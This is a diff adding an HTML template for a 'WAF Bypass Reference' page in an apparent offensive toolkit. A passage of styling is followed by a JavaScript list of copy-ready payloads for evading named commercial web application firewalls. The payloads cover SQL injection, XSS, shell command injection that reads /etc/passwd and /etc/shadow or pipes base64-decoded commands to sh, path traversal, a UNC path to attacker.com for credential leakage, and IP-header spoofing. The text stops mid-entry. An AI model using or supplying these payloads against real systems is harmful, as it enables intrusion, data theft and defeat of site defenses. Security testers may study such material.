@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WAF Bypass Reference — Multiblade</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Syne:wght@700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#080a12;--s1:#0d0f1c;--s2:#121525;--s3:#191d31;
+      --border:#1e2240;--border-hi:#2d3260;
+      --text:#dde1f5;--text-dim:#6b7099;--text-faint:#373b5c;
+      --accent:#6366f1;--accent-hi:#818cf8;--accent-glow:#6366f133;
+      --radius:12px;
+      /* Category accent colors */
+      --sqli:#f97316;     /* orange */
+      --xss:#ec4899;      /* pink */
+      --rce:#ef4444;      /* red */
+      --path:#a78bfa;     /* violet */
+      --http:#22d3ee;     /* cyan */
+      --header:#f59e0b;   /* amber */
+      --encoding:#34d399; /* emerald */
+    }
+    body { background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;font-size:14px;line-height:1.6; }
+
+    .bg-layer{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+    .blob{position:absolute;border-radius:50%;filter:blur(100px);}
+    .blob-1{width:700px;height:700px;background:radial-gradient(circle,#3730a314,transparent 70%);top:-250px;left:-100px;}
+    .blob-2{width:600px;height:600px;background:radial-gradient(circle,#7c3aed0e,transparent 70%);bottom:-150px;right:-80px;}
+    .blob-3{width:400px;height:400px;background:radial-gradient(circle,#f9731608,transparent 70%);top:40%;left:30%;}
+    .grid-ov{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:radial-gradient(circle,#6366f112 1px,transparent 1px);background-size:32px 32px;mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 40%,transparent 100%);}
+
+    .main{position:relative;z-index:1;margin-left:60px;padding:0 0 120px;}
+
+    /* ── Page header ── */
+    .page-header{
+      position:sticky;top:0;z-index:50;
+      background:linear-gradient(180deg,var(--bg) 82%,transparent);
+      padding:24px 40px 16px;
+    }
+    .header-top{display:flex;align-items:center;gap:14px;margin-bottom:14px;flex-wrap:wrap;}
+    .back-link{
+      display:inline-flex;align-items:center;gap:5px;
+      text-decoration:none;color:var(--text-faint);font-size:0.78rem;
+      transition:color 0.15s;flex-shrink:0;
+    }
+    .back-link:hover{color:var(--text-dim);}
+    .page-title{font-family:'Syne',sans-serif;font-size:1.45rem;font-weight:800;letter-spacing:0.04em;}
+    .page-sub{font-size:0.78rem;color:var(--text-dim);margin-top:2px;}
+    .header-badge{
+      margin-left:auto;font-size:0.65rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;
+      padding:3px 10px;border-radius:99px;
+      background:#f9731614;border:1px solid #f9731630;color:var(--sqli);
+      flex-shrink:0;
+    }
+
+    /* ── Controls row ── */
+    .controls{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:4px;}
+    .search-wrap{position:relative;flex:1;min-width:220px;max-width:380px;}
+    .search-icon{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--text-faint);font-size:0.9rem;pointer-events:none;}
+    .search-input{
+      width:100%;background:var(--s1);border:1.5px solid var(--border);border-radius:var(--radius);
+      padding:8px 12px 8px 36px;color:var(--text);font-family:inherit;font-size:0.85rem;
+      outline:none;transition:border-color 0.15s,box-shadow 0.15s;
+    }
+    .search-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow);}
+    .search-input::placeholder{color:var(--text-faint);}
+
+    /* ── Category chips ── */
+    .category-chips{display:flex;flex-wrap:wrap;gap:6px;}
+    .chip{
+      display:inline-flex;align-items:center;gap:5px;
+      padding:5px 13px;border-radius:99px;
+      border:1.5px solid var(--border);background:var(--s1);
+      color:var(--text-dim);font-size:0.72rem;font-weight:600;
+      cursor:pointer;transition:all 0.15s;user-select:none;white-space:nowrap;
+    }
+    .chip:hover{border-color:var(--border-hi);color:var(--text);}
+    .chip.all.active{border-color:var(--accent);color:var(--accent-hi);background:var(--accent-glow);}
+    .chip.sqli.active    {border-color:var(--sqli);    color:var(--sqli);    background:#f9731614;}
+    .chip.xss.active     {border-color:var(--xss);     color:var(--xss);     background:#ec489914;}
+    .chip.rce.active     {border-color:var(--rce);     color:var(--rce);     background:#ef444414;}
+    .chip.path.active    {border-color:var(--path);    color:var(--path);    background:#a78bfa14;}
+    .chip.http.active    {border-color:var(--http);    color:var(--http);    background:#22d3ee14;}
+    .chip.header.active  {border-color:var(--header);  color:var(--header);  background:#f59e0b14;}
+    .chip.encoding.active{border-color:var(--encoding);color:var(--encoding);background:#34d39914;}
+
+    /* ── Stats ── */
+    .stats-bar{padding:8px 40px 0;display:flex;align-items:center;gap:12px;}
+    .stat-pill{font-size:0.72rem;color:var(--text-faint);}
+    .stat-pill strong{color:var(--text-dim);}
+
+    /* ── Technique grid ── */
+    .technique-grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fill,minmax(420px,1fr));
+      gap:14px;
+      padding:16px 40px 0;
+    }
+    @media(max-width:860px){.technique-grid{grid-template-columns:1fr;padding:12px 16px 0;}}
+    @media(max-width:680px){.page-header{padding:16px 16px 12px;}.stats-bar{padding:8px 16px 0;}}
+
+    /* ── Technique card ── */
+    .technique-card{
+      background:var(--s1);border:1.5px solid var(--border);border-radius:var(--radius);
+      overflow:hidden;display:flex;flex-direction:column;
+      transition:border-color 0.2s,box-shadow 0.2s,transform 0.15s;
+      animation:fade-up 0.3s ease both;
+    }
+    .technique-card:hover{border-color:var(--border-hi);box-shadow:0 8px 32px -8px rgba(0,0,0,0.5);transform:translateY(-1px);}
+    .technique-card.hidden{display:none;}
+
+    .card-header{display:flex;align-items:flex-start;gap:10px;padding:14px 16px 10px;}
+    .card-title{font-family:'Syne',sans-serif;font-size:0.95rem;font-weight:800;letter-spacing:0.02em;flex:1;line-height:1.3;}
+    .cat-tag{
+      flex-shrink:0;font-size:0.6rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;
+      padding:2px 9px;border-radius:99px;border:1px solid;margin-top:2px;
+    }
+    .cat-tag.sqli    {color:var(--sqli);    border-color:#f9731640;background:#f9731610;}
+    .cat-tag.xss     {color:var(--xss);     border-color:#ec489940;background:#ec489910;}
+    .cat-tag.rce     {color:var(--rce);     border-color:#ef444440;background:#ef444410;}
+    .cat-tag.path    {color:var(--path);    border-color:#a78bfa40;background:#a78bfa10;}
+    .cat-tag.http    {color:var(--http);    border-color:#22d3ee40;background:#22d3ee10;}
+    .cat-tag.header  {color:var(--header);  border-color:#f59e0b40;background:#f59e0b10;}
+    .cat-tag.encoding{color:var(--encoding);border-color:#34d39940;background:#34d39910;}
+
+    .card-desc{
+      font-size:0.8rem;color:var(--text-dim);line-height:1.6;
+      padding:0 16px 10px;flex:1;
+    }
+
+    /* Payload blocks */
+    .payload-list{display:flex;flex-direction:column;gap:6px;padding:0 16px 14px;}
+    .payload-row{
+      display:flex;align-items:center;gap:8px;
+      background:var(--s2);border:1px solid var(--border);border-radius:8px;
+      padding:8px 10px;
+      transition:border-color 0.15s;
+    }
+    .payload-row:hover{border-color:var(--border-hi);}
+    .bypass-payload{
+      flex:1;font-family:'Fira Code','Menlo','Consolas',monospace;
+      font-size:0.78rem;color:var(--accent-hi);
+      word-break:break-all;white-space:pre-wrap;line-height:1.5;
+      min-width:0;
+    }
+    .copy-payload-btn{
+      flex-shrink:0;background:none;border:1px solid var(--border);
+      color:var(--text-faint);font-size:0.68rem;font-weight:600;
+      padding:3px 9px;border-radius:5px;cursor:pointer;
+      font-family:inherit;letter-spacing:0.04em;
+      transition:color 0.12s,border-color 0.12s,background 0.12s;
+      white-space:nowrap;
+    }
+    .copy-payload-btn:hover{color:var(--text);border-color:var(--border-hi);background:var(--s3);}
+    .copy-payload-btn.copied{color:#34d399;border-color:#34d39940;background:#34d39910;}
+
+    /* WAF tag */
+    .card-footer{display:flex;align-items:center;flex-wrap:wrap;gap:6px;padding:0 16px 12px;}
+    .waf-tag{
+      font-size:0.62rem;font-weight:600;letter-spacing:0.06em;
+      padding:2px 9px;border-radius:99px;
+      background:var(--s3);border:1px solid var(--border);color:var(--text-faint);
+      display:inline-flex;align-items:center;gap:4px;
+    }
+    .waf-tag-label{color:var(--text-faint);font-weight:700;margin-right:2px;}
+
+    /* Empty state */
+    .empty-state{
+      grid-column:1/-1;text-align:center;padding:100px 20px;color:var(--text-faint);
+      display:none;
+    }
+    .empty-state.visible{display:block;}
+    .empty-icon{font-size:2.5rem;margin-bottom:14px;opacity:0.5;}
+    .empty-state p{font-size:0.88rem;}
+
+    /* Scrollbar */
+    ::-webkit-scrollbar{width:5px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+
+    @keyframes fade-up{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+  </style>
+</head>
+<body>
+{% include '_nav.html' %}
+
+<div class="bg-layer" aria-hidden="true">
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
+  <div class="blob blob-3"></div>
+</div>
+<div class="grid-ov" aria-hidden="true"></div>
+
+<div class="main">
+
+  <!-- ── Page Header ── -->
+  <div class="page-header">
+    <div class="header-top">
+      <a href="/generators" class="back-link">← Generators</a>
+      <div>
+        <div class="page-title">WAF Bypass Reference</div>
+        <div class="page-sub">Encoding tricks, filter evasion, and HTTP-level bypasses for common WAF defenses</div>
+      </div>
+      <span class="header-badge">Static Reference</span>
+    </div>
+    <div class="controls">
+      <div class="search-wrap">
+        <span class="search-icon">⌕</span>
+        <input id="search" class="search-input" type="text"
+               placeholder="Search techniques, payloads…"
+               oninput="applyFilters()" />
+      </div>
+      <div class="category-chips" id="cat-chips">
+        <button class="chip all active" data-cat="all"      onclick="setCat(this)">All</button>
+        <button class="chip sqli"       data-cat="sqli"     onclick="setCat(this)">SQLi</button>
+        <button class="chip xss"        data-cat="xss"      onclick="setCat(this)">XSS</button>
+        <button class="chip rce"        data-cat="rce"      onclick="setCat(this)">RCE</button>
+        <button class="chip path"       data-cat="path"     onclick="setCat(this)">Path Traversal</button>
+        <button class="chip http"       data-cat="http"     onclick="setCat(this)">HTTP-Level</button>
+        <button class="chip header"     data-cat="header"   onclick="setCat(this)">Header Abuse</button>
+        <button class="chip encoding"   data-cat="encoding" onclick="setCat(this)">Encoding</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="stats-bar">
+    <span class="stat-pill" id="count-label">Loading…</span>
+  </div>
+
+  <div class="technique-grid" id="technique-grid"></div>
+
+</div><!-- /main -->
+
+<script>
+'use strict';
+
+/* ───────────────────────────────────────────────
+   TECHNIQUE DATA
+─────────────────────────────────────────────── */
+const TECHNIQUES = [
+
+  /* ═══════════════ SQLi ═══════════════ */
+  {
+    id: 'sqli-comment-injection',
+    cat: 'sqli',
+    name: 'Comment Injection',
+    desc: 'Inline SQL comments break apart keywords that signature-based WAFs scan for as contiguous strings.',
+    payloads: [
+      "' OR 1=1/*",
+      "'/**/OR/**/1=1",
+      "' OR/**/1=1--",
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+  {
+    id: 'sqli-case-variation',
+    cat: 'sqli',
+    name: 'Case Variation',
+    desc: 'SQL is case-insensitive. Mixing upper and lowercase defeats regex rules anchored to a specific case pattern.',
+    payloads: [
+      'SeLeCt * FrOm users',
+      "' UnIoN SeLeCt null,null--",
+      'sElEcT 1,2,3',
+    ],
+    wafs: ['Akamai', 'Cloudflare'],
+  },
+  {
+    id: 'sqli-double-encode',
+    cat: 'sqli',
+    name: 'URL Double Encoding',
+    desc: "Some WAFs URL-decode once before inspection. A second layer of encoding (%25 for %) slips the single quote through as %2527 which decodes to %27 (') after the WAF pass.",
+    payloads: [
+      "%2527 OR 1=1--",
+      "%2527%2520OR%25201=1--",
+      "1%2520UNION%2520SELECT%25201,2,3--",
+    ],
+    wafs: ['AWS WAF', 'F5 BIG-IP ASM'],
+  },
+  {
+    id: 'sqli-null-byte',
+    cat: 'sqli',
+    name: 'Null Byte Injection',
+    desc: "A null byte (%00) causes some WAF C-based parsers to truncate string inspection at that point, while the database engine continues processing the full query.",
+    payloads: [
+      "%00' OR 1=1--",
+      "1%00 UNION SELECT 1,2--",
+    ],
+    wafs: ['ModSecurity (older)'],
+  },
+  {
+    id: 'sqli-scientific',
+    cat: 'sqli',
+    name: 'MySQL Scientific Notation',
+    desc: "MySQL accepts scientific notation for numeric literals. Representing an integer as 1e0 or 8e0 can confuse pattern-matching rules expecting a plain digit.",
+    payloads: [
+      '1e0 UNION SELECT 1,2,3--',
+      '1e0OR 1=1--',
+    ],
+    wafs: ['Cloudflare', 'Imperva'],
+  },
+  {
+    id: 'sqli-hpp',
+    cat: 'sqli',
+    name: 'HTTP Parameter Pollution',
+    desc: 'Duplicate a parameter. Some WAFs only inspect the first occurrence while the backend framework (PHP, ASP.NET) may use the last or concatenate both.',
+    payloads: [
+      '?id=1&id=2 UNION SELECT 1,2--',
+      '?q=hello&q=\' OR 1=1--',
+    ],
+    wafs: ['AWS WAF', 'Akamai'],
+  },
+  {
+    id: 'sqli-mid-keyword',
+    cat: 'sqli',
+    name: 'Mid-keyword Comment',
+    desc: 'Inserting a comment inside a keyword (UN/**/ION) splits it into tokens the WAF does not recognise as a keyword, while the SQL parser re-assembles them.',
+    payloads: [
+      'UN/**/ION SE/**/LECT 1,2--',
+      'SE/*test*/LECT * FR/**/OM users--',
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+  {
+    id: 'sqli-whitespace-alt',
+    cat: 'sqli',
+    name: 'Whitespace Alternatives',
+    desc: "SQL accepts several control characters as whitespace that WAF rules may not account for: horizontal tab (%09), newline (%0a), carriage return (%0d), and form feed (%0c).",
+    payloads: [
+      "SELECT%09*%09FROM%09users",
+      "UNION%0aSELECT%0a1,2,3--",
+      "SELECT%0c*%0cFROM%0ctable--",
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+  {
+    id: 'sqli-hex-strings',
+    cat: 'sqli',
+    name: 'Hex-encoded String Literals',
+    desc: "MySQL and MSSQL accept hexadecimal string literals. Using 0x notation replaces quoted strings, bypassing rules that look for quote characters around keywords.",
+    payloads: [
+      "SELECT * FROM users WHERE name=0x61646d696e",
+      "' UNION SELECT 0x70617373776f7264--",
+    ],
+    wafs: ['Imperva', 'Cloudflare'],
+  },
+  {
+    id: 'sqli-concat-obfus',
+    cat: 'sqli',
+    name: 'CONCAT / Function Obfuscation',
+    desc: "Reconstruct a string literal with CONCAT() or CHAR() instead of quoting it. WAFs pattern-matching on static strings cannot match a dynamically built value.",
+    payloads: [
+      "CONCAT(0x61,0x64,0x6d,0x69,0x6e)",
+      "CHAR(97,100,109,105,110)",
+      "' UNION SELECT CONCAT(table_name),2 FROM information_schema.tables--",
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+
+  /* ═══════════════ XSS ═══════════════ */
+  {
+    id: 'xss-mixed-case',
+    cat: 'xss',
+    name: 'Mixed-case Tags',
+    desc: 'HTML parsers are case-insensitive. Browsers normalise tag names on parse, so mixed-case breaks simple string-match rules without affecting execution.',
+    payloads: [
+      '<ScRiPt>alert(1)</ScRiPt>',
+      '<IMG SRC=x OnErRoR=alert(1)>',
+      '<iMg/src=x onerror=alert`1`>',
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+  {
+    id: 'xss-entity-encoding',
+    cat: 'xss',
+    name: 'HTML Entity Encoding',
+    desc: 'HTML entities for angle brackets bypass WAFs inspecting raw characters. The browser decodes entities before parsing markup.',
+    payloads: [
+      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
+      '&#60;img src=x onerror=alert(1)&#62;',
+      '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+  {
+    id: 'xss-null-byte',
+    cat: 'xss',
+    name: 'Null Byte in Tag Name',
+    desc: "A null byte within a tag name is ignored by most browsers during tokenisation but can break pattern-matching in WAF regular expressions.",
+    payloads: [
+      '<scr%00ipt>alert(1)</scr%00ipt>',
+      '<img%00 src=x onerror=alert(1)>',
+    ],
+    wafs: ['ModSecurity (legacy)'],
+  },
+  {
+    id: 'xss-svg-vector',
+    cat: 'xss',
+    name: 'SVG onload Vector',
+    desc: "WAF rules that block <script> tags often ignore SVG event attributes. SVG elements execute inline JS via onload and other events.",
+    payloads: [
+      '<svg/onload=alert(1)>',
+      '<svg><script>alert(1)</script></svg>',
+      '<svg onload="alert(document.domain)">',
+    ],
+    wafs: ['Cloudflare', 'Akamai'],
+  },
+  {
+    id: 'xss-event-handlers',
+    cat: 'xss',
+    name: 'Uncommon Event Handlers',
+    desc: "Rules focused on onerror or onload miss the long tail of HTML event attributes. Less-common handlers are frequently overlooked.",
+    payloads: [
+      '<body onpageshow=alert(1)>',
+      '<details ontoggle=alert(1) open>',
+      '<video oncanplay=alert(1) src=1>',
+      '<input autofocus onfocus=alert(1)>',
+      '<select onchange=alert(1)><option>x</option></select>',
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+  {
+    id: 'xss-unicode-escape',
+    cat: 'xss',
+    name: 'Unicode / JS Escape Sequences',
+    desc: 'JavaScript allows \\uXXXX and \\xXX escapes inside identifiers and strings. Used to reconstruct function names character-by-character inside a JS context.',
+    payloads: [
+      '\\u0061\\u006c\\u0065\\u0072\\u0074(1)',
+      '\\x61\\x6c\\x65\\x72\\x74(1)',
+      'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
+    ],
+    wafs: ['Imperva', 'Cloudflare'],
+  },
+  {
+    id: 'xss-template-literal',
+    cat: 'xss',
+    name: 'Template Literal Injection',
+    desc: 'Backtick template literals are valid JS strings and call tagged template functions. Useful when single and double quotes are both blocked.',
+    payloads: [
+      '`${alert(1)}`',
+      'setTimeout`alert\\x281\\x29`',
+      'Function`alert\\x281\\x29`()',
+    ],
+    wafs: ['Cloudflare', 'AWS WAF'],
+  },
+  {
+    id: 'xss-data-uri',
+    cat: 'xss',
+    name: 'Data URI Injection',
+    desc: "An iframe or link pointing to a data: URI executes HTML in the same-site context in older browsers. Useful when src/href inspection is too narrow.",
+    payloads: [
+      '<iframe src="data:text/html,<script>alert(1)</script>">',
+      '<a href="data:text/html,<img src=x onerror=alert(1)>">click</a>',
+    ],
+    wafs: ['ModSecurity'],
+  },
+  {
+    id: 'xss-srcdoc',
+    cat: 'xss',
+    name: 'Iframe srcdoc',
+    desc: 'The srcdoc attribute renders an HTML document inside the iframe. Entity-encoding the inner markup bypasses WAFs scanning for literal <script> in attribute values.',
+    payloads: [
+      '<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">',
+      '<iframe srcdoc="&#60;img src=x onerror=alert(1)&#62;">',
+    ],
+    wafs: ['Cloudflare', 'Imperva'],
+  },
+  {
+    id: 'xss-mutation',
+    cat: 'xss',
+    name: 'Mutation XSS (mXSS)',
+    desc: "The browser's HTML parser can mutate serialised markup in ways the WAF did not predict. Classic example: noscript title attribute containing a closing noscript tag.",
+    payloads: [
+      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+      '<svg><![CDATA[</p><script>alert(1)</script>]]></svg>',
+    ],
+    wafs: ['Cloudflare'],
+  },
+
+  /* ═══════════════ RCE ═══════════════ */
+  {
+    id: 'rce-ifs',
+    cat: 'rce',
+    name: 'IFS Substitution',
+    desc: 'The $IFS shell variable contains whitespace characters. Using it instead of a literal space bypasses WAF rules that look for space-separated command arguments.',
+    payloads: [
+      'cat${IFS}/etc/passwd',
+      'cat${IFS}${IFS}/etc/shadow',
+      'ls${IFS}-la${IFS}/root',
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+  {
+    id: 'rce-brace-expansion',
+    cat: 'rce',
+    name: 'Brace Expansion',
+    desc: 'Bash brace expansion {a,b} is processed by the shell before execution. The resulting command is identical to the spaced version but uses no spaces.',
+    payloads: [
+      '{cat,/etc/passwd}',
+      '{ls,-la,/}',
+      '{id}',
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+  {
+    id: 'rce-hex-cmd',
+    cat: 'rce',
+    name: 'Hex-encoded Command',
+    desc: "printf can emit arbitrary bytes from hex escapes. Combining this with command substitution reconstructs the command name at runtime, hiding it from static analysis.",
+    payloads: [
+      "$(printf '\\x63\\x61\\x74') /etc/passwd",
+      "$(printf '\\x69\\x64')",
+      "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
+    ],
+    wafs: ['Imperva', 'ModSecurity'],
+  },
+  {
+    id: 'rce-base64',
+    cat: 'rce',
+    name: 'Base64 Decode Shell Execution',
+    desc: "Embed a base64-encoded command and decode it at runtime with base64 -d. The WAF sees an opaque string rather than a recognisable shell command.",
+    payloads: [
+      '$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh)',
+      '$(echo aWQ= | base64 -d | bash)',
+      'bash -c "$(echo d2hvYW1p | base64 -d)"',
+    ],
+    wafs: ['AWS WAF', 'Cloudflare'],
+  },
+  {
+    id: 'rce-backtick',
+    cat: 'rce',
+    name: 'Backtick vs $() Substitution',
+    desc: 'Backticks and $() are functionally equivalent for command substitution, but WAF rules blocking one form may not block the other.',
+    payloads: [
+      '`id`',
+      '`cat /etc/passwd`',
+      'echo `whoami`',
+    ],
+    wafs: ['ModSecurity'],
+  },
+  {
+    id: 'rce-separator-variants',
+    cat: 'rce',
+    name: 'Command Separator Variants',
+    desc: 'URL-encode common separators to evade rules that block literal semicolons, newlines, or pipes. Multiple encodings represent the same byte to different parsers.',
+    payloads: [
+      'cmd1%0aid',
+      'cmd1%0did',
+      'cmd1%3bid',
+      'cmd1%7cid',
+      'cmd1;%20id',
+    ],
+    wafs: ['Cloudflare', 'Imperva'],
+  },
+  {
+    id: 'rce-wildcard',
+    cat: 'rce',
+    name: 'Wildcard / Glob Expansion',
+    desc: 'Shell glob patterns expand to matching paths. A pattern like /???/??ss?? can match /bin/passwd without spelling out the path, defeating keyword-based filters.',
+    payloads: [
+      '/???/??ss??',
+      '/???/cat /etc/passwd',
+      '/b??/c?t /e??/pa??wd',
+    ],
+    wafs: ['ModSecurity', 'AWS WAF'],
+  },
+
+  /* ═══════════════ Path Traversal ═══════════════ */
+  {
+    id: 'path-double-encode',
+    cat: 'path',
+    name: 'Double URL Encoding',
+    desc: "Percent-encode the percent sign itself (%25). A WAF decoding once sees %2e%2e%2f — an innocuous sequence. The backend decodes again and processes ../.",
+    payloads: [
+      '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
+      '..%252f..%252f..%252fetc%252fshadow',
+      '%252e%252e/%252e%252e/etc/passwd',
+    ],
+    wafs: ['ModSecurity', 'F5 BIG-IP ASM'],
+  },
+  {
+    id: 'path-url-encode',
+    cat: 'path',
+    name: 'Single URL Encoding of Slash',
+    desc: "Percent-encoding the forward slash (%2f) hides the traversal from simple string-match rules that look for the literal ../ sequence.",
+    payloads: [
+      '..%2f..%2f..%2fetc%2fpasswd',
+      '..%2f..%2fetc%2fshadow',
+      '..%2fconfig.php',
+    ],
+    wafs: ['AWS WAF', 'Akamai'],
+  },
+  {
+    id: 'path-overlong-utf8',
+    cat: 'path',
+    name: 'Overlong UTF-8 Encoding',
+    desc: "Overlong UTF-8 sequences represent a character using more bytes than necessary. The sequence %c0%af is an overlong encoding of '/' that some parsers accept.",
+    payloads: [
+      '..%c0%af..%c0%afetc%c0%afpasswd',
+      '..%c1%9c..%c1%9cetc%c1%9cpasswd',
+    ],
+    wafs: ['ModSecurity (legacy)', 'IIS'],
+  },
+  {
+    id: 'path-mixed-separator',
+    cat: 'path',
+    name: 'Mixed Path Separators',
+    desc: 'Windows accepts both forward and backward slashes. Mixing them confuses WAF normalisation while the Windows file API resolves the path correctly.',
+    payloads: [
+      '..\\..\\..\\windows\\win.ini',
+      '..\\../..\\../etc/passwd',
+      '..\\/..\\/',
+    ],
+    wafs: ['IIS WAF', 'F5 BIG-IP ASM'],
+  },
+  {
+    id: 'path-null-byte',
+    cat: 'path',
+    name: 'Null Byte Extension Bypass',
+    desc: "A null byte terminates the string in C-based file open calls. Appending %00.jpg makes the WAF think the file has an allowed extension while the OS opens the real file.",
+    payloads: [
+      '../../../etc/passwd%00.jpg',
+      '../../../etc/shadow%00.png',
+      '..%2f..%2fetc%2fpasswd%00.gif',
+    ],
+    wafs: ['ModSecurity (legacy)', 'PHP-based WAFs'],
+  },
+  {
+    id: 'path-unc',
+    cat: 'path',
+    name: 'UNC Path (Windows)',
+    desc: "On Windows, a UNC path (\\\\server\\share\\file) can reach remote SMB shares. Useful for SSRF, credential leakage, or reading remote files if the app resolves paths literally.",
+    payloads: [
+      '\\\\attacker.com\\share\\file',
+      '\\\\127.0.0.1\\C$\\windows\\win.ini',
+    ],
+    wafs: ['F5 BIG-IP ASM'],
+  },
+
+  /* ═══════════════ HTTP-Level ═══════════════ */
+  {
+    id: 'http-chunked',
+    cat: 'http',
+    name: 'Chunked Transfer Encoding',
+    desc: "Split a payload across multiple HTTP chunks. Some WAFs that inspect the body as a stream may miss a payload that spans a chunk boundary without fully reassembling.",
+    payloads: [
+      'Transfer-Encoding: chunked\r\n\r\n5\r\nHello\r\n6\r\n World\r\n0\r\n\r\n',
+      '1\r\nA\r\n1\r\n\'\r\n0\r\n\r\n',
+    ],
+    wafs: ['AWS WAF', 'Cloudflare'],
+  },
+  {
+    id: 'http-content-type',
+    cat: 'http',
+    name: 'Content-Type Switching',
+    desc: "Sending a JSON body with Content-Type: application/x-www-form-urlencoded (or vice versa) can confuse WAFs that parse body content based on the declared content type.",
+    payloads: [
+      'Content-Type: application/x-www-form-urlencoded\r\n\r\n{"key":"value\' OR 1=1--"}',
+      'Content-Type: application/json\r\n\r\nparam=value%27+OR+1%3D1--',
+    ],
+    wafs: ['ModSecurity', 'Imperva'],
+  },
+  {
+    id: 'http-method-override',
+    cat: 'http',
+    name: 'HTTP Method Override',
+    desc: "Some middleware honours X-HTTP-Method-Override to change the effective method. A WAF rule applying only to POST can be bypassed by sending GET with the override header.",
+    payloads: [
+      'GET /api/admin HTTP/1.1\r\nX-HTTP-Method-Override: DELETE',
+      'POST /api/data HTTP/1.1\r\nX-HTTP-Method-Override: PUT',
+    ],
+    wafs: ['AWS WAF', 'Cloudflare'],
+  },
+  {
+    id: 'http-xff-bypass',
+    cat: 'http',
+    name: 'X-Forwarded-For IP Bypass',
+    desc: "WAF rules that allow requests from trusted IPs (localhost, internal ranges) can be fooled if the WAF or backend trusts the X-Forwarded-For header for IP determination.",
+    payloads: [
+      'X-Forwarded-For: 127.0.0.1',
+      'X-Forwarded-For: 192.168.1.1',
+      'X-Forwarded-For: 10.0.0.1',
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+  {
+    id: 'http-header-case',
+    cat: 'http',
+    name: 'Header Name Case Manipulation',
+    desc: "HTTP/1.1 header names are case-insensitive by specification. WAF rules matching exact casing fail when the header is sent in an unexpected case.",
+    payloads: [
+      'CONTENT-TYPE: application/json',
+      'content-type: application/json',
+      'CoNtEnT-tYpE: application/json',
+    ],
+    wafs: ['ModSecurity'],
+  },
+  {
+    id: 'http-trailing-dot',
+    cat: 'http',
+    name: 'Trailing Dot in Hostname',
+    desc: "DNS fully-qualified domain names end with a trailing dot. Sending Host: target.com. is equivalent from the DNS perspective but may not match the WAF's hostname blocklist.",
+    payloads: [
+      'Host: target.com.',
+      'Host: internal.corp..',
+    ],
+    wafs: ['Akamai', 'Cloudflare'],
+  },
+  {
+    id: 'http-ip-representation',
+    cat: 'http',
+    name: 'Alternative IP Representations',
+    desc: "IP addresses can be written in decimal (dword), octal, hex, or mixed notation. These all resolve to the same address but bypass blocklists matching dotted-decimal format.",
+    payloads: [
+      'http://2130706433/',
+      'http://0x7f000001/',
+      'http://0177.0.0.1/',
+      'http://3232235777/',
+    ],
+    wafs: ['Cloudflare', 'AWS WAF'],
+  },
+
+  /* ═══════════════ Header Abuse ═══════════════ */
+  {
+    id: 'hdr-xff-spoof',
+    cat: 'header',
+    name: 'X-Forwarded-For Spoofing',
+    desc: "Applications using X-Forwarded-For to determine client IP for allow-list logic can be fooled by injecting a trusted address. WAFs that whitelist internal IPs by XFF are especially vulnerable.",
+    payloads: [
+      'X-Forwarded-For: 127.0.0.1',
+      'X-Forwarded-For: 192.168.0.1, 127.0.0.1',
+      'X-Forwarded-For: ::1',
+    ],
+    wafs: ['ModSecurity', 'Cloudflare'],
+  },
+  {
+    id: 'hdr-real-ip',
+    cat: 'header',
+    name: 'X-Real-IP Spoofing',
+    desc: "Nginx commonly passes the client IP to the backend via X-Real-IP. If the WAF does not sanitise this header before forwarding, injecting a trusted address bypasses IP checks.",
+    payloads: [
+      'X-Real-IP: 127.0.0.1',
+      'X-Real-IP: 10.0.0.1',
+    ],
+    wafs: ['Nginx WAF modules'],
+  },
+  {
+    id: 'hdr-originating-ip',
+    cat: 'header',
+    name: 'X-Originating-IP Spoofing',
+    desc: "Older Microsoft and webmail systems check X-Originating-IP for sender location. Injecting a loopback or internal address can bypass geographic or network-level ACLs.",
+    payloads: [
+      'X-Originating-IP: 127.0.0.1',
+      'X-Originating-IP: 192.168.1.100',
+    ],
+    wafs: ['Legacy WAF products'],
+  },
+  {
+    id: 'hdr-referer-bypass',
+    cat: 'header',
+    name: 'Referer-based Bypass',
